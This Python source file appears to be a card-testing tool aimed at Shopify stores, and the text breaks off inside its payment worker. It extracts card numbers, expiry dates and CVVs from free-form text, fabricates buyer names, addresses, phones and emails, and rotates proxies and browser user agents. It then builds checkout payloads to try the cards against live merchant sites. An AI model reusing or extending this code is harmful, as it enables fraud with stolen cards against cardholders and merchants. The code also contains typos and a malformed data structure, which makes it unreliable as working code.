import time
import re
import random
import re
import csv
import os
import asyncio
import json
import phonenumbers
import time
import ssl
from faker import Faker
from datetime import datetime
import aiohttp
import urllib.parse
import uuid
import re
from datetime import datetime
from typing import List, Dict
from fastapi import FastAPI, Query
import aiohttp
from contextlib import asynccontextmanager

    
def find_between(text, start_str, end_str):
    start_idx = text.find(start_str)
    if start_idx == -1:
        return None
    start_idx += len(start_str)
    end_idx = text.find(end_str, start_idx)
    if end_idx == -1:
        return None
    return text[start_idx:end_idx]



def build_delivery_terms(
    is_shippable,
    address,
    stable_id,
    variant_price,
    currency_code,
    handle="927e65bd4bc6307e397981607cd07c2e-2d5b7643c5a9b084c778d283352aeeef",
):
    if is_shippable:
        return {
            "deliveryLines": [
                {
                    "destination": {
                        "partialStreetAddress": {
                            "address1": address["street"],
                            "address2": address["street"],
                            "city": address["city"],
                            "countryCode": address["country"],
                            "postalCode": address["postal_code"],
                            "firstName": address["first_name"],
                            "lastName": address["last_name"],
                            "zoneCode": address["zoneCode"],
                            "phone": address["phone"],
                            "oneTimeUse": False,
                        },
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": handle,
                            "customDeliveryRate": False,
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {
                        "lines": [
                            {
                                "stableId": stable_id,
                            },
                        ],
                    },
                    "deliveryMethodTypes": [
                        "SHIPPING",
                    ],
                    "expectedTotalPrice": {
                        "value": {
                            "amount": variant_price,
                            "currencyCode": currency_code,
                        },
                    },
                    "destinationChanged": False,
                },
            ],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
    else:
        return {
            "deliveryLines": 
                {
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {
                                "any": True,
                            },
                            "shipments": {
                                "any": True,
                            },
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {
                        "lines": [
                            {
                                "stableId": stable_id,
                            },
                        ],
                    },
                    "deliveryMethodTypes": [
                        "NONE",
                    ],
                    "expectedTotalPrice": {
                        "any": True,
                    },
                    "destinationChanged": True,
                },
            ],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }


def build_submit_delivery_terms(
    is_shippable, address, stable_id, shipping_amount, currency_code, seller_handle
):
    if is_shippable:
        return {
            "deliveryLines": [
                {
                    "destination": {
                        "streetAddress": {
                            "address1": address["street"],
                            "address2": address["street"],
                            "city": address["city"],
                            "countryCode": address["country"],
                            "postalCode": address["postal_code"],
                            "firstName": address["first_name"],
                            "lastName": address["last_name"],
                            "zoneCode": address["zoneCode"],
                            "phone": address["phone"],
                            "oneTimeUse": False,
                        },
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": seller_handle,
                            "customDeliveryRate": False,
                        },
                        "options": {
                            "phone": address["phone"],
                        },
                    },
                    "targetMerchandiseLines": {
                        "lines": [
                            {
                                "stableId": stable_id,
                            },
                        ],
                    },
                    "deliveryMethodTypes": [
                        "SHIPPING",
                    ],
                    "expectedTotalPrice": {
                        "value": {
                            "amount": shipping_amount,
                            "currencyCode": currency_code,
                        },
                    },
                    "destinationChanged": False,
                },
            ],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
    else:
        return {
            "deliveryLines": [
                {
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyMatchingConditions": {
                            "estimatedTimeInTransit": {
                                "any": True,
                            },
                            "shipments": {
                                "any": True,
                            },
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {
                        "lines": [
                            {
                                "stableId": stable_id,
                            },
                        ],
                    },
                    "deliveryMethodTypes": [
                        "NONE",
                    ],
                    "expectedTotalPrice": {
                        "any": True,
                    },
                    "destinationChanged": True,
                },
            ],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True,
        }
        


def parse_card_input(card_input: str):
    text = card_input or ""
    
    def luhn_check(num):
        digits = list(map(int, num))
        odd = sum(digits[-1::-2])
        even = sum(sum(divmod(2 * d, 10)) for d in digits[-2::-2])
        return (odd + even) % 10 == 0
    
    def month_to_number(month_name):
        month_map = {
            'jan': 1, 'january': 1, 'feb': 2, 'february': 2,
            'mar': 3, 'march': 3, 'apr': 4, 'april': 4,
            'may': 5, 'jun': 6, 'june': 6, 'jul': 7, 'july': 7,
            'aug': 8, 'august': 8, 'sep': 9, 'september': 9,
            'oct': 10, 'october': 10, 'nov': 11, 'november': 11,
            'dec': 12, 'december': 12
        }
        return month_map.get(month_name[:3].lower(), 1)
    
    def parse_cc_line(line: str):
        line = line.strip()
        if not line or line.startswith("#"):
            return Mone 
        
        MONTH_PATTERNS = [
            r'(?:jan|january|feb|february|mar|march|apr|april|may|jun|june|jul|july|aug|august|sep|september|oct|october|nov|november|dec|december)',
            r'(?:0?[1-9]|1[0-2])'
        ]
        
        YEAR_PATTERNS = [
            r'\'?\d{2}',
            r'\d{4}'    
        ]
        
        SEPARATORS = r'[\s\|\/\-\.,\;:_]'
        
        PATTERNS = [
            re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + YEAR_PATTERNS[1] + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
            re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + YEAR_PATTERNS[0] + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
            re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[0] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
            re.compile(r"\b(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
            re.compile(r"\b(\d{3,4})" + SEPARATORS + r"(\d{13,19})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")\b", re.IGNORECASE),
            re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
            re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[0] + r")\s*" + SEPARATORS + r"?\s*(" + "|".join(YEAR_PATTERNS) + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
            re.compile(r"(?:card|cc|ccnum|cc num|card num|card number|cardnumber|number|pan)\s*[:=\-]?\s*(\d{13,19}).*?(?:exp|expiry|expires|expiration|exp date|expiry date|date)\s*[:=\-]?\s*(" + MONTH_PATTERNS[1] + r")(" + YEAR_PATTERNS[1] + r").*?(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})", re.IGNORECASE | re.DOTALL),
            re.compile(r"\b(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3,4})" + SEPARATORS + r"(" + MONTH_PATTERNS[1] + r")" + SEPARATORS + r"(" + "|".join(YEAR_PATTERNS) + r")" + SEPARATORS + r"(\d{3,4})\b", re.IGNORECASE),
            re.compile(r"\b(\d{4}[\s\-]?\d{4}[\s\-]?\d{4}[\s\-]?\d{3,4})\s+(" + MONTH_PATTERNS[1] + r")[\/\-](" + "|".join(YEAR_PATTERNS) + r")\s+(\d{3,4})\b", re.IGNORECASE),
        ]
        
        for pattern in PATTERNS:
            match = pattern.search(line)
            if match:
                try:
                    groups = match.groups()
                    
                    if len(groups[0]) in [3, 4] and len(groups) == 4:
                        if len(groups[1]) >= 13:
                            cvv, card, month, year = groups
                        else:
                            card, month, year, cvv = groups
                    else:
                        card, month, year, cvv = groups
                    
                    card = re.sub(r'[\s\-]', '', card)
                    
                    if not re.fullmatch(r"\d{13,19}", card):
                        continue
                    
                    if month.isalpha():
                        month = month_to_number(month.lower())
                    else:
                        try:
                            month = int(month)
                        except:
                            continue
                    
                    try:
                        year = str(year).lstrip("'")
                        year_int = int(year)
                        if year_int < 100:
                            year_int += 2000
                        elif year_int < 2000:
                            year_int += 2000
                    except:
                        continue
                    
                    if not (1 <= month <= 12):
                        continue
                    
                    return {
                        "number": card,
                        "month": month,
                        "year": year_int,
                        "verification_value": cvv,
                        "name": "Test Card"
                    }
                except Exception:
                    continue
        
        parts = re.split(r"[,\|;:\s]+", line)
        parts = [p for p in parts if p]
        if len(parts) < 4:
            return None
        number = re.sub(r'[\s\-]', '', parts[0])
        if not re.fullmatch(r"\d{13,19}", number or ""):
            return None
        try:
            month = int(parts[1])
            year = int(parts[2])
            if year < 100:
                year += 2000
        except Exception:
            return None
        cvv = parts[3]
        return {
            "number": number,
            "month": month,
            "year": year,
            "verification_value": cvv,
            "name": "Test Card"
        }
    
    def _extract_multiline_cards(text: str) -> List[Dict]:
        cards = []
        
        card_patterns = [
            r'(?:ccnum|cc num|card num|card number|card|cc|number|pan|cardnumber)\s*[:=\-]?\s*(\d{13,19})',
            r'\b(\d{13,19})\b',
            r'(\d{13,19})',
        ]
        
        exp_patterns = [
            r'(?:exp|expiry|expires|expiration|date|exp date|expiry date)\s*[:=\-]?\s*(\d{1,2})\s*[\/\-]\s*(\d{2,4})',
            r'(?:exp|expiry|expires|expiration|date|exp date|expiry date)\s*[:=\-]?\s*(\d{2})(\d{2,4})',
            r'\b(\d{1,2})\s*[\/\-]\s*(\d{2,4})\b',
            r'\b(\d{2})[^\d]*(\d{2,4})\b',
        ]
        
        cvv_patterns = [
            r'(?:cvv|cvc|cv2|code|security code|security|pin)\s*[:=\-]?\s*(\d{3,4})',
            r'\b(\d{3,4})\b',
        ]
        
        card_numbers = []
        seen_card_nums = {}
        for pattern in card_patterns:
            matches = re.finditer(pattern, text, re.IGNORECASE)
            for match in matches:
                card_num = match.group(1)
                if 13 <= len(card_num) <= 19:
                    if card_num not in seen_card_nums:
                        seen_card_nums[card_num] = (match.start(), match.end())
                        card_numbers.append((card_num, match.start(), match.end()))
        
        for card_num, card_start, card_end in card_numbers:
            window_start = max(0, card_start - 200)
            window_end = min(len(text), card_end + 300)
            window_text = text[window_start:window_end]
            
            card_offset_in_window = card_start - window_start
            card_in_window_start = card_offset_in_window
            card_in_window_end = card_offset_in_window + len(card_num)
            
            exp_month = None
            exp_year = None
            year_match_pos = None
            for pattern in exp_patterns:
                match = re.search(pattern, window_text, re.IGNORECASE)
                if match:
                    if len(match.groups()) == 2:
                        exp_month = int(match.group(1))
                        year_str = match.group(2)
                        exp_year = int(year_str)
                        if exp_year < 100:
                            exp_year += 2000
                        if 1 <= exp_month <= 12:
                            break
                        else:
                            exp_month = None
                            exp_year = None
            
            if not exp_month or not exp_year:
                two_digit_matches = list(re.finditer(r'(\d{2})', window_text))
                year_matches = list(re.finditer(r'(\d{2,4})', window_text))
                
                for month_match in two_digit_matches:
                    if (month_match.start() >= card_in_window_start and 
                        month_match.start() < card_in_window_end):
                        continue
                        
                    potential_month = int(month_match.group(1))
                    if 1 <= potential_month <= 12:
                        for year_match in year_matches:
                            if (year_match.start() >= card_in_window_start and 
                                year_match.start() < card_in_window_end):
                                continue
                                
                            if year_match.start() > month_match.end():
                                potential_year = int(year_match.group(1))
                                if potential_year >= 20 and potential_year <= 99:
                                    potential_year += 2000
                                elif potential_year >= 2020 and potential_year <= 2099:
                                    pass
                                else:
                                    continue
                                
                                if year_match.start() - month_match.end() <= 100:
                                    exp_month = potential_month
                                    exp_year = potential_year
                                    year_match_pos = (year_match.start(), year_match.end())
                                    break
                    if exp_month and exp_year:
                        break
            
            cvv = None
            all_3digit = list(re.finditer(r'(\d{3})', window_text))
            valid_3digit = []
            for match in all_3digit:
                if (match.start() >= card_in_window_start and 
                    match.start() < card_in_window_end):
                    continue
                
                if year_match_pos:
                    year_start, year_end = year_match_pos
                    if (match.start() >= year_start and match.start() < year_end):
                        continue
                    
                potential = match.group(1)
                is_valid = Truen
                if exp_month and potential == str(exp_month).zfill(2):
                    is_valid = False
                if exp_year and potential == str(exp_year)[-3:]:
                    is_valid = False
                if is_valid:
                    valid_3digit.append((match, potential))
            
            if len(valid_3digit) == 1:
                cvv = valid_3digit[0][1]
            else:
                for i, pattern in enumerate(cvv_patterns):
                    matches = list(re.finditer(pattern, window_text, re.IGNORECASE))
                    matches_after = [m for m in matches if m.start() > card_offset_in_window]
                    matches_before = [m for m in matches if m.start() <= card_offset_in_window]
                    sorted_matches = matches_after + matches_before
                    
                    for match in sorted_matches:
                        potential_cvv = match.group(1)
                        is_valid_cvv = (potential_cvv != card_num[-4:] and potential_cvv not in card_num)
                        if exp_year:
                            is_valid_cvv = is_valid_cvv and (potential_cvv != str(exp_year)[-4:] and potential_cvv not in str(exp_year))
                        if exp_month:
                            is_valid_cvv = is_valid_cvv and (potential_cvv != str(exp_month).zfill(2))
                        
                        if is_valid_cvv:
                            if i == len(cvv_patterns) - 1:
                                if potential_cvv not in card_num:
                                    cvv = potential_cvv
                                    break
                            else:
                                cvv = potential_cvv
                                break
                    if cvv:
                        break
            
            if exp_month and exp_year and cvv:
                if luhn_check(card_num):
                    current_year = datetime.now().year
                    current_month = datetime.now().month
                    if exp_year > current_year or (exp_year == current_year and exp_month >= current_month):
                        cards.append({
                            'number': card_num,
                            'month': exp_month,
                            'year': exp_year,
                            'verification_value': cvv,
                        })
        
        unique_cards = []
        seen = set()
        for card in cards:
            card_key = f"{card['number']}|{card['month']}|{card['year']}|{card['verification_value']}"
            if card_key not in seen:
                seen.add(card_key)
                unique_cards.append(card)
        
        return unique_cards
    
    fast_pattern = r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})'
    fast_match = re.search(fast_pattern, text)
    
    if fast_match:
        try:
            number = fast_match.group(1)
            month = int(fast_match.group(2))
            year = int(fast_match.group(3))
            cvv = fast_match.group(4)
            
            if luhn_check(number) and 1 <= month <= 12:
                if year < 100:
                    year += 2000
                
                current_year = datetime.now().year
                current_month = datetime.now().month
                
                if year > current_year or (year == current_year and month >= current_month):
                    cvv_len = 4 if number.startswith(("34", "37")) else 3
                    if len(cvv) == cvv_len:
                        return number, str(month).zfill(2), str(year), cvv
        except:
            pass
    
    seen_cards = set()
    
    for line in text.splitlines():
        card = parse_cc_line(line)
        if card:
            card_key = f"{card['number']}|{card['month']}|{card['year']}|{card['verification_value']}"
            if card_key not in seen_cards:
                seen_cards.add(card_key)
                current_year = datetime.now().year
                current_month = datetime.now().month
                if card['year'] > current_year or (card['year'] == current_year and card['month'] >= current_month):
                    cvv_len = 4 if card['number'].startswith(("34", "37")) else 3
                    if len(card['verification_value']) == cvv_len:
                        return card['number'], str(card['month']).zfill(2), str(card['year']), card['verification_value']
    
    multi_line_cards = _extract_multiline_cards(text)
    for card in multi_line_cards:
        card_key = f"{card['number']}|{card['month']}|{card['year']}|{card['verification_value']}"
        if card_key not in seen_cards:
            seen_cards.add(card_key)
            return card['number'], str(card['month']).zfill(2), str(card['year']), card['verification_value']
    
    raise ValueError("No valid cards or card expired")




def load_geonames(file_path=None):

    if file_path is None:
        file_path = "allCountries.csv"

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            reader = csv.DictReader(f)
            for row in reader:
                try:
                    country_code = row.get("COUNTRYCODE", "").strip()
                    country = row.get("COUNTRY", "").strip()
                    postal = row.get("POSTAL_CODE", "").strip()
                    city = row.get("CITY", "").strip()
                    state = row.get("STATE", "").strip()
                    zone_code = row.get("ZONECODE", "").strip()

                    if (
                        not country_code
                        or not country
                        or not postal
                        or not city
                        or not state
                    ):
                        continue

                    if country_code not in geo_data:
                        geo_data[country_code] = []

                    geo_data[country_code].append(
                        {
                            "country_code": country_code,
                            "country": country,
                            "postal_code": postal,
                            "city": city,
                            "state": state,
                            "zone_code": zone_code,
                        }
                    )
                except Exception as e:
                    continue
    except Exception as e:
        pass
    return geo_data


try:
    geo_data = load_geonames("allCountries.csv")
except Exception as e:
    pass
geo_data = geo_data if "geo_data" in locals() else {}


def detect_card_brand_from_number(card_number: str) -> str:
    """Detect card brand from card number using BIN ranges"""
    if not card_number or not card_number.isdigit():
        return "UNKNOWN"

    first_digit = card_number[0]
    first_two = card_number[:2] if len(card_number) >= 2 else ""
    first_four = card_number[:4] if len(card_number) >= 4 else ""

    if first_digit == "4":
        return "VISA"

    if first_two in ["51", "52", "53", "54", "55"]:
        return "MASTERCARD"
    if first_four and 2221 <= int(first_four) <= 2720:
        return "MASTERCARD"

    if first_two in ["34", "37"] and len(card_number) == 15:
        return "AMEX"

    if first_four == "6011":
        return "DISCOVER"
    if first_two == "65":
        return "DISCOVER"
    if len(card_number) >= 6:
        first_six = int(card_number[:6])
        if 622126 <= first_six <= 622925:
            return "DISCOVER"
    if first_four and 6440 <= int(first_four) <= 6499:
        return "DISCOVER"

    if first_four and 3000 <= int(first_four) <= 3059:
        return "DINERS"
    if first_two in ["36", "38"]:
        return "DINERS"

    if first_four and 3528 <= int(first_four) <= 3589:
        return "JCB"

    if first_two == "62":
        return "UNIONPAY"

    return "UNKNOWN"





faker = Faker()


def generate_phone_number(store_country):
    try:
        ex_num = phonenumbers.example_number_for_type(
            store_country, phonenumbers.PhoneNumberType.MOBILE
        )
        if ex_num:
            phone = f"+{ex_num.country_code}{ex_num.national_number}"
        else:
            phone = faker.msisdn()
    except:
        phone = faker.msisdn()

    return phone


def analyze_geo_coverage(geo_data):
    """Analyze what countries/states we actually have data for"""
    coverage = {}
    for country_code, addresses in geo_data.items():
        states = set()
        for addr in addresses[:100]:
            if addr.get("state") and addr.get("postal_code"):
                states.add(addr["state"])
        coverage[country_code] = {
            "state_count": len(states),
            "has_data": len(states) > 0,
        }
    return coverage


def get_best_country_for_store(domain, currency_code, geo_data):
    """Determine the best country for a store using domain, geo_data, and currency (popular countries prioritized)."""

    domain = domain.lower()
    fallback = "US"

    if not domain.endswith(".myshopify.com"):

        if domain.endswith(".us") or domain.endswith(".com"):
            if "US" in geo_data and geo_data["US"]:
                return "US"
            else:
                return fallback
        if domain.endswith(".co.uk") or domain.endswith(".uk"):
            if "GB" in geo_data and geo_data["GB"]:
                return "GB"
            else:
                return fallback
        if domain.endswith(".ca"):
            if "CA" in geo_data and geo_data["CA"]:
                return "CA"
            else:
                return fallback

        if domain.endswith(".nz") or domain.endswith(".co.nz"):
            if "NZ" in geo_data and geo_data["NZ"]:
                return "NZ"
            else:
                return fallback
        if domain.endswith(".com.au") or domain.endswith(".au"):
            if "AU" in geo_data and geo_data["AU"]:
                return "AU"
            else:
                return fallback

        if domain.endswith(".de"):
            if "DE" in geo_data and geo_data["DE"]:
                return "DE"
            else:
                return fallback
        if domain.endswith(".fr"):
            if "FR" in geo_data and geo_data["FR"]:
                return "FR"
            else:
                return fallback
        if domain.endswith(".it"):
            if "IT" in geo_data and geo_data["IT"]:
                return "IT"
            else:
                return fallback
        if domain.endswith(".es"):
            if "ES" in geo_data and geo_data["ES"]:
                return "ES"
            else:
                return fallback
        if domain.endswith(".nl"):
            if "NL" in geo_data and geo_data["NL"]:
                return "NL"
            else:
                return fallback
        if domain.endswith(".se"):
            if "SE" in geo_data and geo_data["SE"]:
                return "SE"
            else:
                return fallback
        if domain.endswith(".no"):
            if "NO" in geo_data and geo_data["NO"]:
                return "NO"
            else:
                return fallback
        if domain.endswith(".fi"):
            if "FI" in geo_data and geo_data["FI"]:
                return "FI"
            else:
                return fallback

        if domain.endswith(".jp"):
            if "JP" in geo_data and geo_data["JP"]:
                return "JP"
            else:
                return fallback
        if domain.endswith(".sg"):
            if "SG" in geo_data and geo_data["SG"]:
                return "SG"
            else:
                return fallback
        if domain.endswith(".hk"):
            if "HK" in geo_data and geo_data["HK"]:
                return "HK"
            else:
                return fallback
        if domain.endswith(".my"):
            if "MY" in geo_data and geo_data["MY"]:
                return "MY"
            else:
                return fallback
        if domain.endswith(".in"):
            if "IN" in geo_data and geo_data["IN"]:
                return "IN"
            else:
                return fallback

    coverage = analyze_geo_coverage(geo_data)
    if coverage:
        valid_countries = {
            c: v["state_count"] for c, v in coverage.items() if v["has_data"]
        }
        if valid_countries:
            best_geo_country = max(valid_countries.items(), key=lambda x: x[1])[0]
            return best_geo_country

    currency_map = {
        "USD": "US",
        "CAD": "CA",
        "MXN": "MX",
        "GBP": "GB",
        "EUR": "DE",
        "CHF": "CH",
        "SEK": "SE",
        "NOK": "NO",
        "DKK": "DK",
        "PLN": "PL",
        "CZK": "CZ",
        "HUF": "HU",
        "RON": "RO",
        "AUD": "AU",
        "NZD": "NZ",
        "JPY": "JP",
        "CNY": "CN",
        "HKD": "HK",
        "SGD": "SG",
        "KRW": "KR",
        "INR": "IN",
        "IDR": "ID",
        "THB": "TH",
        "MYR": "MY",
        "PHP": "PH",
        "VND": "VN",
        "AED": "AE",
        "SAR": "SA",
        "ILS": "IL",
        "ZAR": "ZA",
        "EGP": "EG",
        "NGN": "NG",
        "KES": "KE",
        "BRL": "BR",
        "ARS": "AR",
        "CLP": "CL",
        "COP": "CO",
        "PEN": "PE",
        "RUB": "RU",
        "TRY": "TR",
    }
    if currency_code in currency_map:
        selected = currency_map[currency_code]
        if selected in geo_data and geo_data[selected]:
            return selected

    return fallback


def get_best_state_postal_city(country_code, geo_data):
    """Pick state, postal code, and city fully consistent"""
    if country_code not in geo_data:
        return "NY", "10001", "New York"

    state_postal_count = {}
    for addr in geo_data[country_code]:
        state = addr.get("state", "")
        if state and addr.get("postal_code") and addr.get("city"):
            state_postal_count[state] = state_postal_count.get(state, 0) + 1

    if not state_postal_count:
        return "NY", "10001", "New York"

    best_state = max(state_postal_count.keys(), key=lambda k: state_postal_count[k])

    for addr in geo_data[country_code]:
        if (
            addr.get("state") == best_state
            and addr.get("postal_code")
            and addr.get("city")
        ):
            return best_state, addr["postal_code"], addr["city"]

    return "NY", "10001", "New York"


def generate_fake_identity(country_code):
    """Generate realistic fake names based on country"""

    name_formats = {
        "US": {"first": "en_US", "last": "en_US"},
        "GB": {"first": "en_GB", "last": "en_GB"},
        "CA": {"first": "en_CA", "last": "en_CA"},
        "AU": {"first": "en_AU", "last": "en_AU"},
        "NZ": {"first": "en_NZ", "last": "en_NZ"},
        "DE": {"first": "de_DE", "last": "de_DE"},
        "FR": {"first": "fr_FR", "last": "fr_FR"},
        "IT": {"first": "it_IT", "last": "it_IT"},
        "ES": {"first": "es_ES", "last": "es_ES"},
        "JP": {"first": "ja_JP", "last": "ja_JP"},
        "CN": {"first": "zh_CN", "last": "zh_CN"},
        "IN": {"first": "en_IN", "last": "en_IN"},
        "BR": {"first": "pt_BR", "last": "pt_BR"},
        "RU": {"first": "ru_RU", "last": "ru_RU"},
    }

    name_format = name_formats.get(country_code, {"first": "en_US", "last": "en_US"})

    try:
        first_name = Faker(name_format["first"]).first_name()
        last_name = Faker(name_format["last"]).last_name()
    except:

        first_name = faker.first_name()
        last_name = faker.last_name()

    email_domains = [
        "gmail.com",
        "yahoo.com",
        "hotmail.com",
        "outlook.com",
        "icloud.com",
    ]
    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 999)}@{random.choice(email_domains)}"

    return first_name, last_name, email


def generate_smart_address(domain, currency_code, geo_data):
    """Generate address with fake identity"""
    country_code = get_best_country_for_store(domain, currency_code, geo_data)
    best_state, best_postal, best_city = get_best_state_postal_city(
        country_code, geo_data
    )
    phone = generate_phone_number(country_code)

    first_name, last_name, email = generate_fake_identity(country_code)

    return {
        "street": f"{random.randint(100, 9999)} {faker.street_name()}",
        "city": best_city,
        "country": country_code,
        "postal_code": best_postal,
        "first_name": first_name,
        "last_name": last_name,
        "zoneCode": best_state,
        "phone": phone,
        "email": email,
    }

def normalize_proxy(proxy: str | None) -> str | None:
    if not proxy:
        return None

    p = proxy.strip()

    if "://" in p and "@" in p:
        return p

    if "@" in p:
        return f"http://{p}"

    parts = p.rsplit(":", 3)
    
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    
    return None




PROFILES = [
    "chrome136",
    "chrome133a",
    "chrome131",
    "chrome124",
    "chrome146",
    "chrome145"
]


def extract_clean_domain(url: str) -> str:
    if not url:
        return ""
    url = url.strip().lower()
    if url.startswith("http://"):
        url = url[7:]
    elif url.startswith("https://"):
        url = url[8:]
    url = url.lstrip(":/")
    return url.split("/")[0]
        



USER_AGENTS = [
    # --- Windows Chrome (2026 & Late 2025) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
    
    # --- Mac Chrome (2026 & Late 2025) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
    
    # --- Windows Firefox (2026) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0",
    
    # --- Mac Firefox (2026) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:152.0) Gecko/20100101 Firefox/152.0",
    
    # --- Windows Edge (2026) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36 Edg/150.0.0.0",
    
    # --- Mac Safari (2025/2026) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15",
    
    # --- Linux Chrome (2026) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
]

async def shopify_payment_worker(session, base_domain: str, card_input: str, proxy=None):
    start_time = time.time()

    try:
        if not base_domain or not card_input:
            return {"status": "ERROR", "message": "Missing inputs", "time": 0}
        try:
            card_number, card_month, card_year, card_cvv = parse_card_input(card_input)
            bin_info =  {}
            card_type = bin_info.get("scheme", "UNKNOWN")
            country_code = bin_info.get("country_code", "US")
            card_bank = bin_info.get("bank", "UNKNOWN")
            card_category = bin_info.get("category", "UNKNOWN")
        except Exception as e:
            return {
                "status": "ERROR",
                "message": str(e),
                "time": time.time() - start_time,
                "amount": "0",
                "currency": "USD",
                "gateway": "Normal"
            }
                    
        base_domain = extract_clean_domain(base_domain)             
        proxy = normalize_proxy(proxy)
        store_url = f"https://{base_domain}"
        max_retries = 3 
        
        proxy_url = normalize_proxy(proxy)

        domain_ok = False
        last_error = ""
        
        ua = random.choice(USER_AGENTS)
        timeout_settings = aiohttp.ClientTimeout(total=35)
        headers={
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'user-agent': ua,
        }                
        for attempt in range(max_retries):
            try:
                await asyncio.sleep(random.uniform(0.4, 0.9))
                async with session.get(
                    store_url, 
                    allow_redirects=True,
                    proxy=proxy_url,
                    timeout=timeout_settings,
                    headers=headers,
                ) as domain_resp:
                    
                    final_domain_url = str(domain_resp.url).rstrip('/')
                    
                    if "challenge" not in final_domain_url:
                        store_url = final_domain_url.split("?")[0]
                        base_domain = store_url.replace("https://", "").replace("http://", "").split("/")[0]
                        
                    domain_ok = True
                    break 
                    
            except Exception as e:
                last_error = str(e)
                e_lower = last_error.lower()                    
                _FATAL_KWDS = ('407', 'proxy auth', 'proxy authentication')                    
                if any(kw in e_lower for kw in _FATAL_KWDS):
                    break                          
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.0) 
                    continue
                else:
                    break 

        if not domain_ok:

            return {
                "status": "ERROR",
                "message": f"Domain Error: {last_error}", 
                "time": time.time() - start_time,
                "amount": "0",
                "currency": "USD",
                "gateway": "Normal",
            }
        
        products = {"products": []}
        json_ok = False
        p_headers = {
